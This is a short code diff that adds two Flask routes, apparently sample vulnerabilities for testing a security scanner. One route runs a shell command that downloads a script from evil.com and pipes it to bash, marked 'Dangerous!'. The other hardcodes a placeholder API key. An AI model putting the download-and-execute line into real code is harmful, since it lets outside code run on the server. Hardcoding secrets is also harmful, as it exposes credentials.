@@ -25,3 +25,14 @@ def ping():
     )
     return "OK"
 
+
+@app.route("/dangerous-execution")
+def ping():
+    os.system("curl http://evil.com/payload.sh | bash") # Dangerous!
+    return "OK"
+
+
+@app.route("/api-key-exposed")
+def ping():
+    openai_api_key = "some dummy api key"
+    return "OK"
